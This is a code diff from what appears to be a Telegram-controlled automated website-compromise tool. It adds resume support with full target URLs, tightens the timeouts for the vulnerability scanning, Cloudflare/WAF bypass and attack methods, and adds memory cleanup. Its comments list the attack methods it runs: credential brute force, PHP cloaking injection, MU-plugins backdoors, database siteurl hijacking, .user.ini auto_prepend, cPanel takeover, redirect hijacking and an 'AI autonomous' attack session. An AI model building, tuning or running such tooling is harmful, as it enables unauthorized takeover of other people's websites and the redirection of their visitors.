@@ -243,6 +243,7 @@ interface PendingAttackState {
   method: string;
   chatId: number;
   redirectUrl?: string;
+  targetUrl?: string; // Full URL path like domain.com/events
   triedMethods: string[];
   succeededMethods: string[];
   originIp?: string;
@@ -272,6 +273,7 @@ async function savePendingAttack(state: PendingAttackState): Promise<void> {
       cmsType: state.cmsType,
       serverType: state.serverType,
       abortReason: "SIGTERM",
+      targetUrl: state.targetUrl,
       totalMethods: state.totalMethods,
       completedMethods: state.completedMethods,
     });
@@ -350,7 +352,11 @@ export async function resumePendingAttacks(): Promise<void> {
             wafType: pa.wafType,
             cmsType: pa.cmsType,
             serverType: pa.serverType,
+            targetUrl: pa.targetUrl, // Preserve URL path (e.g. /events)
           };
+          
+          // Use targetUrl if available (preserves URL path like /events)
+          const attackTarget = pa.targetUrl || pa.domain;
           
           // Process the attack command via handleTelegramWebhook
           await handleTelegramWebhook({
@@ -359,7 +365,7 @@ export async function resumePendingAttacks(): Promise<void> {
               message_id: Date.now(),
               chat: { id: chatId, type: "private" },
               from: { id: chatId, first_name: "Resume" },
-              text: `/attack ${pa.domain}`,
+              text: `/attack ${attackTarget}`,
               date: Math.floor(Date.now() / 1000),
             },
           });
@@ -5631,7 +5637,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       
       // Track last scan stage to avoid duplicate updates
       let lastScanStage = "";
-      const VULN_SCAN_TIMEOUT = 180_000; // 180s timeout for vuln scan (increased from 120s — WAF-protected sites need more time)
+      const VULN_SCAN_TIMEOUT = 90_000; // 90s timeout for vuln scan — reduced to save memory budget for 20 methods
       
       try {
         // Wrap fullVulnScan with timeout to prevent pipeline hang
@@ -5756,7 +5762,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           const cfResult = await Promise.race([
             runCfBypass({
               targetUrl: effectiveTargetUrl,
-              timeout: 110_000,
+              timeout: 50_000, // 50s internal timeout
               enableOriginDiscovery: true,
               enableHeaderManipulation: true,
               enableCacheBypass: true,
@@ -5765,7 +5771,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                 narrator.addAnalysis(`🛡️ ${technique}: ${detail.substring(0, 80)}`).catch(() => {});
               },
             }),
-            new Promise<null>((resolve) => setTimeout(() => resolve(null), 120_000)) // 2 min timeout
+            new Promise<null>((resolve) => setTimeout(() => resolve(null), 60_000)) // 60s timeout — reduced from 120s
           ]);
           
           const wafMs = Date.now() - wafStart;
@@ -6141,32 +6147,32 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // Set totalMethods for progress counter display
       (narrator as any).config.totalMethods = methodOrder.length;
       
-      // ═══ PER-METHOD TIMEOUTS (GENEROUS) ═══
-      // Each method gets a generous time budget. If it exceeds this, it's killed and we move to the next.
-      // With 50-min method loop and 60-min total, we can afford 5 min per method
-      // 16 methods x 5 min = 80 min max, but most finish in 1-2 min
+      // ═══ PER-METHOD TIMEOUTS (TIGHT — prevent memory buildup) ═══
+      // Each method gets a TIGHT time budget. Memory is the bottleneck, not time.
+      // Platform kills at ~350MB RSS. Each method leaks ~30-50MB from HTTP buffers.
+      // With 20 methods, we need each to finish fast and GC between them.
+      // 20 methods × 2 min = 40 min max, most finish in 30-60s
       const METHOD_TIMEOUTS: Record<string, number> = {
-        pipeline: 5 * 60 * 1000,       // 5 min — unified pipeline (most comprehensive)
-        agentic_auto: 8 * 60 * 1000,   // 8 min — AI autonomous session (needs time to think + act)
-        hijack: 5 * 60 * 1000,         // 5 min — credential hunt + brute force
-        advanced: 5 * 60 * 1000,       // 5 min — advanced techniques (5 sub-techniques)
-        cloaking: 4 * 60 * 1000,       // 4 min — PHP cloaking injection
-        cpanel_full: 5 * 60 * 1000,    // 5 min — cPanel full control (many sub-steps)
-        redirect: 3 * 60 * 1000,       // 3 min — redirect takeover
-        mu_plugins: 3 * 60 * 1000,     // 3 min — MU-plugins backdoor
-        db_siteurl: 3 * 60 * 1000,     // 3 min — DB siteurl hijack
-        auto_prepend: 3 * 60 * 1000,   // 3 min — .user.ini auto_prepend
-        open_redirect: 3 * 60 * 1000,  // 3 min — open redirect chain
+        pipeline: 3 * 60 * 1000,       // 3 min — unified pipeline (has its own internal globalTimeout)
+        agentic_auto: 3 * 60 * 1000,   // 3 min — AI autonomous session
+        hijack: 2 * 60 * 1000,         // 2 min — credential hunt + brute force
+        advanced: 2 * 60 * 1000,       // 2 min — advanced techniques
+        cloaking: 2 * 60 * 1000,       // 2 min — PHP cloaking injection
+        cpanel_full: 2 * 60 * 1000,    // 2 min — cPanel full control
+        redirect: 90 * 1000,           // 90s — redirect takeover
+        mu_plugins: 90 * 1000,         // 90s — MU-plugins backdoor
+        db_siteurl: 90 * 1000,         // 90s — DB siteurl hijack
+        auto_prepend: 90 * 1000,       // 90s — .user.ini auto_prepend
+        open_redirect: 90 * 1000,      // 90s — open redirect chain
       };
-      const DEFAULT_METHOD_TIMEOUT = 3 * 60 * 1000; // 3 min default (was 2 min)
+      const DEFAULT_METHOD_TIMEOUT = 90 * 1000; // 90s default — most methods should finish in 30-60s
       const MAX_CONSECUTIVE_FAILURES = 50; // NEVER stop early — run ALL methods regardless of failures
       
-      // ═══ GLOBAL METHOD LOOP TIMEOUT (20 min) ═══
+      // ═══ GLOBAL METHOD LOOP TIMEOUT ═══
       console.log(`[TelegramAI] full_chain PHASE 2: Starting method loop with ${methodOrder.length} methods for ${domain}`);
-      // Graceful shutdown: when this deadline is reached, stop trying new methods and send summary
-      // Increased to 50 min to allow ALL 16+ methods to run fully (each ~3-5 min)
+      // 40 min method loop: 20 methods × 2 min avg = 40 min
       // This is separate from ATTACK_TIMEOUT_MS (60 min) which covers the entire attack including vuln scan + verify
-      const FULL_CHAIN_METHOD_LOOP_TIMEOUT_MS = 50 * 60 * 1000; // 50 minutes for all method attempts
+      const FULL_CHAIN_METHOD_LOOP_TIMEOUT_MS = 40 * 60 * 1000; // 40 minutes for all method attempts
       const methodLoopDeadline = Date.now() + FULL_CHAIN_METHOD_LOOP_TIMEOUT_MS;
       
       // Helper: run with per-method timeout + abort signal
@@ -6313,7 +6319,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                 enableComprehensiveAttacks: true,
                 enablePostUpload: true,
                 userId: 1,
-                globalTimeout: 5 * 60 * 1000, // 5 min — match per-method timeout (generous for WAF-protected sites)
+                globalTimeout: 3 * 60 * 1000, // 3 min — pipeline is 1 of 20 methods, must respect time budget
                 ...(discoveredOriginIp ? { originIp: discoveredOriginIp } : {}),
               },
               async (event) => {
@@ -7117,6 +7123,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         // Update globalThis attack state for resume system (used by MEGA CATCH)
         (globalThis as any)[`__attackState_${domain}`] = {
           redirectUrl,
+          targetUrl: effectiveTargetUrl, // Preserve URL path for resume
           triedMethods: methodOutcomes.map(o => o.methodId),
           succeededMethods: methodOutcomes.filter(o => o.success).map(o => o.methodId),
           originIp: discoveredOriginIp,
@@ -7195,24 +7202,41 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         // Update global method index
         globalMethodIndex += batch.methods.length;
         
-        // ═══ MEMORY CLEANUP BETWEEN BATCHES ═══
+        // ═══ AGGRESSIVE MEMORY CLEANUP BETWEEN METHODS ═══
         // Force garbage collection to reclaim memory from completed method
-        // This is critical to prevent OOM on platforms with ~512MB limit
+        // Platform kills at ~350MB RSS. Each method leaks ~30-50MB from HTTP buffers.
         try {
           const memBefore = process.memoryUsage();
-          if (global.gc) {
-            global.gc();
-            const memAfter = process.memoryUsage();
-            const freedMB = Math.round((memBefore.rss - memAfter.rss) / 1024 / 1024);
-            if (freedMB > 5) {
-              console.log(`[GC] Freed ${freedMB}MB after batch ${bi + 1} (RSS: ${Math.round(memAfter.rss / 1024 / 1024)}MB)`);
-            }
-          }
+          const rssBefore = Math.round(memBefore.rss / 1024 / 1024);
+          
           // Clear any cached data from globalThis that methods may have stored
           const globalAny = globalThis as any;
           if (globalAny.__lastPipelineLeakCreds) globalAny.__lastPipelineLeakCreds = [];
           if (globalAny.__lastShodanPorts) globalAny.__lastShodanPorts = [];
           if (globalAny.__lastVulnScanResult) globalAny.__lastVulnScanResult = null;
+          
+          // Run GC twice — first pass marks, second pass sweeps
+          if (global.gc) {
+            global.gc();
+            // Small delay to let finalizers run before second GC pass
+            await new Promise(r => setTimeout(r, 100));
+            global.gc();
+          }
+          
+          const memAfter = process.memoryUsage();
+          const rssAfter = Math.round(memAfter.rss / 1024 / 1024);
+          const freedMB = rssBefore - rssAfter;
+          
+          console.log(`[GC] Method ${globalMethodIndex}/${methodOrder.length}: RSS ${rssBefore}→${rssAfter}MB (freed ${freedMB}MB)`);
+          
+          // CRITICAL: If RSS is still high after GC, wait longer to let OS reclaim pages
+          if (rssAfter > 280) {
+            console.warn(`[GC] ⚠️ RSS ${rssAfter}MB > 280MB threshold — waiting 2s for OS to reclaim memory`);
+            await new Promise(r => setTimeout(r, 2000));
+            if (global.gc) global.gc();
+            const memFinal = process.memoryUsage();
+            console.log(`[GC] After extended cleanup: RSS ${Math.round(memFinal.rss / 1024 / 1024)}MB`);
+          }
         } catch (gcErr) {
           console.error(`[GC] Error during cleanup:`, gcErr);
         }
@@ -7708,6 +7732,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               method: "full_chain",
               chatId,
               redirectUrl: resumeState?.redirectUrl,
+              targetUrl: resumeState?.targetUrl || effectiveTargetUrl, // Preserve URL path for resume
               triedMethods: resumeState?.triedMethods || [],
               succeededMethods: resumeState?.succeededMethods || [],
               originIp: resumeState?.originIp,
